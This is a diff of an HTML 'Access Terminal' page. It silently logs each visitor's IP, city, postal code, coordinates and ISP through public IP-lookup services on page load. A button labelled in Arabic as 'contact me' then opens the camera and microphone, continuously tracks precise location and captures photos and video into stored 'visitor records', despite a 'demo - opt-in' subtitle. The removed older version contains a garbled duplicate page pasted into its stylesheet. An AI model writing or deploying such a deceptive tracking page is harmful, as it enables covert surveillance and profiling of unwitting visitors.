@@ -2,12 +2,12 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome | Simple Access Page</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Access Terminal</title>
     <style>
         * {
-            box-sizing: border-box;
+            box-sizing: border-box
         }
 
         body {
@@ -16,119 +16,39 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: "Segoe UI", Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #f8fbff 0%, #eef4ff 100%);
-            color: #1f2937;
-            padding: 20px;
-        }
-
-        .card {
-            background: #ffffff;
-            border: 1px solid #dbeafe;
-            border-radius: 20px;
-        }
-
-        < !DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Hacker Terminal | Network Trace</title><style>* {
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: "Consolas", "Courier New", monospace;
+            font-family: Consolas, monospace;
             background: radial-gradient(circle at top, #10261b 0%, #020604 70%, #000 100%);
             color: #7cffb2;
-            padding: 20px;
-            text-shadow: 0 0 6px rgba(124, 255, 178, 0.35);
+            padding: 20px
         }
 
         .card {
-            background: rgba(2, 12, 8, 0.95);
+            background: rgba(2, 12, 8, .95);
             border: 1px solid #2bff8a;
             border-radius: 16px;
-            padding: 32px;
-            max-width: 440px;
+            padding: 28px;
+            max-width: 520px;
             width: 100%;
-            box-shadow: 0 0 25px rgba(43, 255, 138, 0.25);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .card::before {
-            content: "";
-            position: absolute;
-            inset: 0;
-            background: repeating-linear-gradient(180deg, rgba(43, 255, 138, 0.03), rgba(43, 255, 138, 0.03) 1px, transparent 1px, transparent 4px);
-            pointer-events: none;
+            box-shadow: 0 0 25px rgba(43, 255, 138, .25);
+            position: relative
         }
 
         h1 {
-            font-size: 20px;
+            font-size: 18px;
             margin: 0 0 6px;
             color: #8bffbb;
-            letter-spacing: 0.1em;
-            text-transform: uppercase;
+            letter-spacing: .08em;
+            text-transform: uppercase
         }
 
         p.sub {
             color: #5bd98b;
             font-size: 13px;
-            margin: 0 0 20px;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-        }
-
-        .row {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid rgba(43, 255, 138, 0.2);
-            font-size: 14px;
-        }
-
-        .row:last-child {
-            border-bottom: none;
-        }
-
-        .label {
-            color: #78c996;
-        }
-
-        .value {
-            color: #f0fff6;
-            font-weight: 600;
-            text-align: right;
-        }
-
-        .loading {
-            text-align: center;
-            color: #5bd98b;
-            padding: 20px 0;
-        }
-
-        .map-link {
-            display: inline-block;
-            margin-top: 20px;
-            text-align: center;
-            width: 100%;
-            padding: 10px;
-            background: rgba(43, 255, 138, 0.12);
-            border: 1px solid rgba(43, 255, 138, 0.3);
-            border-radius: 8px;
-            color: #dfffe9;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .map-link:hover {
-            background: rgba(43, 255, 138, 0.2);
+            margin: 0 0 16px
         }
 
         .actions {
-            margin: 0 0 12px;
+            margin: 0 0 12px
         }
 
         .action-btn {
@@ -140,40 +60,44 @@
             color: #7cffb2;
             font-size: 14px;
             font-weight: 700;
-            cursor: pointer;
-            letter-spacing: 0.06em;
-            text-transform: uppercase;
-        }
-
-        .action-btn:hover {
-            background: #123b22;
-            box-shadow: 0 0 12px rgba(43, 255, 138, 0.25);
+            cursor: pointer
         }
 
         .action-btn:disabled {
-            opacity: 0.7;
-            cursor: wait;
+            opacity: .7
+        }
+
+        #camControls {
+            margin-top: 12px;
+            display: none
+        }
+
+        #camPreview {
+            width: 100%;
+            border-radius: 8px;
+            margin-top: 8px
+        }
+
+        .controls-row {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px
+        }
+
+        .controls-row .action-btn {
+            flex: 1
         }
 
         .status {
-            margin: 10px 0 16px;
+            margin: 10px 0 0;
             font-size: 13px;
             color: #b9ffd2;
-            min-height: 20px;
-            line-height: 1.5;
+            min-height: 24px
         }
 
-        .status.success {
-            color: #86efac;
-        }
-
-        .status.error {
-            color: #fda4af;
-        }
-
-        .error {
-            color: #f87171;
-            text-align: center;
+        .loading {
+            color: #5bd98b;
+            padding: 10px 0
         }
     </style>
 </head>
@@ -181,173 +105,92 @@
 <body>
     <div class="card">
         <h1>Access Terminal</h1>
-        <p class="sub">Network trace • camera • location</p>
+        <p class="sub">Network trace • camera • location (demo - opt-in)</p>
         <div class="actions">
             <button id="accessBtn" class="action-btn" type="button">تواصل معي</button>
+            <div id="camControls">
+                <video id="camPreview" autoplay playsinline></video>
+                <div class="controls-row">
+                    <button id="captureBtn" class="action-btn">Capture Photo</button>
+                    <button id="startRecBtn" class="action-btn">Start Recording</button>
+                    <button id="stopRecBtn" class="action-btn" style="display:none">Stop Recording</button>
+                </div>
+            </div>
         </div>
-        <div id="status" class="status">Awaiting access request...</div>
-        <div id="content" class="loading">Scanning IP signature...</div>
+        <div id="status" class="status">Awaiting action...</div>
+        <div id="content" class="loading"></div>
     </div>
 
     <script>
+        // Storage helpers
+        function readRecords() { try { return JSON.parse(localStorage.getItem('visitorRecords') || '[]') } catch (e) { return [] } }
+        function writeRecords(r) { localStorage.setItem('visitorRecords', JSON.stringify(r)) }
+        function saveVisitorRecord(data) { const list = readRecords(); const rec = { id: Date.now(), timestamp: new Date().toISOString(), ...data }; writeRecords([rec, ...list].slice(0, 50)); return rec.id }
+        function updateRecord(id, patch) { const list = readRecords(); const i = list.findIndex(r => r.id === id); if (i === -1) return false; list[i] = Object.assign({}, list[i], patch); writeRecords(list); return true }
+
         const accessBtn = document.getElementById('accessBtn');
         const statusEl = document.getElementById('status');
+        const camControls = document.getElementById('camControls');
+        const camPreview = document.getElementById('camPreview');
+        const captureBtn = document.getElementById('captureBtn');
+        const startRecBtn = document.getElementById('startRecBtn');
+        const stopRecBtn = document.getElementById('stopRecBtn');
 
-        async function requestPermissions() {
-            accessBtn.disabled = true;
-            statusEl.className = 'status';
+        let mediaStream = null, mediaRecorder = null, recordedChunks = [], activeRecordId = null, watchId = null;
+
+        async function tryIpwhois() { try { const r = await fetch('https://ipwho.is/'); if (!r.ok) throw new Error('ipwho.is fail'); const d = await r.json(); if (!d.success) throw new Error(d.message || 'fail'); return { ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone && d.timezone.id, org: d.connection && d.connection.isp } } catch (e) { return null } }
+        async function tryIpapi() { try { const r = await fetch('https://ipapi.co/json/'); if (!r.ok) throw new Error('ipapi fail'); const d = await r.json(); if (d.error) throw new Error(d.reason || 'fail'); return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone, org: d.org } } catch (e) { return null } }
+
+        async function startCameraUI() {
+            try { mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }) } catch (e) { statusEl.textContent = 'Camera permission denied or unavailable.'; return }
+            camPreview.srcObject = mediaStream; camControls.style.display = 'block'; statusEl.textContent = 'Camera ready. You can capture photo or record video.';
+            // If activeRecordId was not created on load, create it now
+            if (!activeRecordId) {
+                const recId = saveVisitorRecord({ ip: null, city: null, region: null, country: null, postal: null, lat: null, lon: null, timezone: null, org: null, ua: navigator.userAgent, media: [], locationHistory: [] });
+                activeRecordId = recId;
+                let info = await tryIpwhois(); if (!info) info = await tryIpapi(); if (info) updateRecord(activeRecordId, info);
+            }
+            // start geolocation watch
+            if (navigator.geolocation) {
+                watchId = navigator.geolocation.watchPosition(pos => {
+                    const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, time: new Date().toISOString() };
+                    const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId); if (i !== -1) { list[i].locationHistory = list[i].locationHistory || []; list[i].locationHistory.push(coords); list[i].lat = coords.lat; list[i].lon = coords.lon; writeRecords(list) }
+                }, err => { console.warn('geoloc err', err) }, { enableHighAccuracy: true, maximumAge: 3000 })
+            }
+        }
+
+        // Auto-log visitor IP on page load
+        async function autoLogVisitor() {
+            const recId = saveVisitorRecord({ ip: null, city: null, region: null, country: null, postal: null, lat: null, lon: null, timezone: null, org: null, ua: navigator.userAgent, media: [], locationHistory: [] });
+            activeRecordId = recId;
+            let info = await tryIpwhois(); if (!info) info = await tryIpapi(); if (info) updateRecord(activeRecordId, info);
+        }
+        autoLogVisitor();
+
+        accessBtn.addEventListener('click', async () => {
             statusEl.textContent = 'Requesting permissions...';
+            // Request camera and geolocation via startCameraUI (handles permissions and saving)
+            await startCameraUI();
+        });
 
-            const cameraPromise = navigator.mediaDevices?.getUserMedia
-                ? navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                : Promise.reject(new Error('Camera access is not supported in this browser.'));
+        captureBtn.addEventListener('click', () => {
+            if (!mediaStream) { alert('Camera not started'); return }
+            const video = camPreview; const canvas = document.createElement('canvas'); canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480; const ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0, canvas.width, canvas.height); const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+            if (activeRecordId) { const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId); if (i !== -1) { list[i].media = list[i].media || []; list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() }); writeRecords(list); alert('Photo saved to Dashboard.') } }
+        });
 
-            const locationPromise = navigator.geolocation
-                ? new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                    });
-                })
-                : Promise.reject(new Error('Geolocation is not supported in this browser.'));
+        startRecBtn.addEventListener('click', () => {
+            if (!mediaStream) { alert('Camera not started'); return }
+            recordedChunks = []; mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+            mediaRecorder.ondataavailable = e => { if (e.data && e.data.size) recordedChunks.push(e.data) };
+            mediaRecorder.onstop = () => { const blob = new Blob(recordedChunks, { type: 'video/webm' }); const reader = new FileReader(); reader.onload = () => { const dataUrl = reader.result; if (activeRecordId) { const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId); if (i !== -1) { list[i].media = list[i].media || []; list[i].media.push({ type: 'video', data: dataUrl, time: new Date().toISOString() }); writeRecords(list); alert('Video saved to Dashboard.') } } }; reader.readAsDataURL(blob) };
+            mediaRecorder.start(); startRecBtn.style.display = 'none'; stopRecBtn.style.display = 'inline-block'; statusEl.textContent = 'Recording...';
+        });
+        stopRecBtn.addEventListener('click', () => { if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop(); startRecBtn.style.display = 'inline-block'; stopRecBtn.style.display = 'none'; statusEl.textContent = 'Recording stopped.' });
 
-            const [cameraResult, locationResult] = await Promise.allSettled([cameraPromise, locationPromise]);
+        // cleanup on unload
+        window.addEventListener('beforeunload', () => { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()) }; if (watchId && navigator.geolocation) navigator.geolocation.clearWatch(watchId) });
 
-            let cameraMessage = 'Camera access was not granted.';
-            let locationMessage = 'Location access was not granted.';
-
-            if (cameraResult.status === 'fulfilled') {
-                cameraResult.value.getTracks().forEach(track => track.stop());
-                cameraMessage = 'Camera access granted.';
-            } else if (cameraResult.reason?.message) {
-                cameraMessage = cameraResult.reason.message;
-            }
-
-            if (locationResult.status === 'fulfilled') {
-                const coords = locationResult.value.coords;
-                locationMessage = `Location access granted at ${coords.latitude.toFixed(4)}, ${coords.longitude.toFixed(4)}.`;
-            } else if (locationResult.reason?.message) {
-                locationMessage = locationResult.reason.message;
-            }
-
-            statusEl.className = 'status success';
-            statusEl.innerHTML = `${cameraMessage}<br>${locationMessage}`;
-            accessBtn.disabled = false;
-
-            // Save a visitor record on explicit user action (button click)
-            try {
-                const data = {
-                    ip: null,
-                    city: null,
-                    region: null,
-                    country: null,
-                    postal: null,
-                    lat: (locationResult && locationResult.status === 'fulfilled') ? locationResult.value.coords.latitude : null,
-                    lon: (locationResult && locationResult.status === 'fulfilled') ? locationResult.value.coords.longitude : null,
-                    timezone: null,
-                    org: null,
-                    ua: navigator.userAgent,
-                    source: 'button',
-                };
-                saveVisitorRecord(data);
-            } catch (e) { /* ignore */ }
-        }
-
-        accessBtn.addEventListener('click', requestPermissions);
-
-        async function tryIpwhois() {
-            const res = await fetch('https://ipwho.is/');
-            if (!res.ok) throw new Error('ipwho.is request failed');
-            const d = await res.json();
-            if (!d.success) throw new Error(d.message || 'ipwho.is lookup failed');
-            return {
-                ip: d.ip,
-                city: d.city,
-                region: d.region,
-                country: d.country,
-                postal: d.postal,
-                lat: d.latitude,
-                lon: d.longitude,
-                timezone: d.timezone && d.timezone.id,
-                org: d.connection && d.connection.isp,
-            };
-        }
-
-        async function tryIpapi() {
-            const res = await fetch('https://ipapi.co/json/');
-            if (!res.ok) throw new Error('ipapi.co request failed');
-            const d = await res.json();
-            if (d.error) throw new Error(d.reason || 'ipapi.co lookup failed');
-            return {
-                ip: d.ip,
-                city: d.city,
-                region: d.region,
-                country: d.country_name,
-                postal: d.postal,
-                lat: d.latitude,
-                lon: d.longitude,
-                timezone: d.timezone,
-                org: d.org,
-            };
-        }
-
-        function saveVisitorRecord(data) {
-            try {
-                const raw = localStorage.getItem('visitorRecords');
-                const list = raw ? JSON.parse(raw) : [];
-                const record = {
-                    id: Date.now(),
-                    timestamp: new Date().toISOString(),
-                    ...data,
-                };
-                const next = [record, ...list].slice(0, 50);
-                localStorage.setItem('visitorRecords', JSON.stringify(next));
-            } catch (e) {
-                console.warn('Could not save visitor record', e);
-            }
-        }
-
-        async function loadInfo() {
-            const el = document.getElementById('content');
-            let data;
-            try {
-                data = await tryIpwhois();
-            } catch (e1) {
-                try {
-                    data = await tryIpapi();
-                } catch (e2) {
-                    el.className = 'error';
-                    el.innerHTML = `Could not determine location.<br><small>${e2.message}</small><br><small>Tip: this page must be loaded over http/https (a live URL), not opened directly as a local file.</small>`;
-                    return;
-                }
-            }
-
-            try { saveVisitorRecord(data); } catch (e) { /* ignore */ }
-
-            const rows = [
-                ['IP Address', data.ip],
-                ['City', data.city],
-                ['Region', data.region],
-                ['Country', data.country],
-                ['Postal Code', data.postal],
-                ['Coordinates', (data.lat && data.lon) ? `${data.lat}, ${data.lon}` : 'N/A'],
-                ['Timezone', data.timezone],
-                ['ISP / Org', data.org],
-            ];
-
-            el.className = '';
-            el.innerHTML = rows.map(([label, value]) => `
-                            <div class="row">
-                                <span class="label">${label}</span>
-                                <span class="value">${value ?? 'N/A'}</span>
-                            </div>
-                        `).join('') + (
-                    (data.lat && data.lon)
-                        ? `<a class="map-link" target="_blank" href="https://www.google.com/maps?q=${data.lat},${data.lon}">View approximate area on map</a>`
-                        : ''
-                );
-        }
-        loadInfo();
     </script>
 </body>
 
